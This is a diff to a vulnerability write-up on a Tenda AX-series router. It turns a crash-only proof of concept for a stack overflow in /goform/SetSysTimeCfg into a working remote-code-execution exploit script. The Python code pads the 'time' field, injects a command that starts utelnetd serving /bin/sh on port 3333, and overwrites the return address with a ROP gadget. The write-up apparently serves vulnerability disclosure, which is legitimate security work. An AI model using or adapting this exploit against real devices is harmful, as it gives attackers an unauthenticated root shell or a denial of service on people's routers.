@@ -20,18 +20,35 @@ Then `v6` will be splice to stack by function sscanf without any security check,
 
 So by POSTing the page `/goform/SetSysTimeCfg` with proper `time`, the attacker can easily perform a **Remote Code Execution** or **Deny of Service(DoS)** with carefully crafted overflow data.
 
-# POC
+# Exp 
+
+Remote Code Exection
 
 ```python
+# Title: Exploit of Tenda-AX3's buffer overflow 
+# Author: R1nd0&c0rn
+# Date: 12/01/2022
+# Vendor Homepage: https://www.tenda.com.cn/
+# Version: AX1806 v1.0.0.1
+
 import requests
 from pwn import *
+
+gadget = 0x37208
 
 url = "https://192.168.2.1/goform/SetSysTimeCfg"
 
 timeType = "manual"
 
 time = b"2022-01-01 "
-time += b"a"*0x2000
+
+time += b"a" * 0x380 
+time += b"bbbb"
+time += b";"
+time += b"/usr/sbin/utelnetd -l /bin/sh -p 3333"# command
+time += b":"
+time += b"c" * 0x374 + p32(gadget)
+
 r = requests.post(url, data={'timeType': timeType, 'time': time},verify=False)
 print(r.content)
 ```
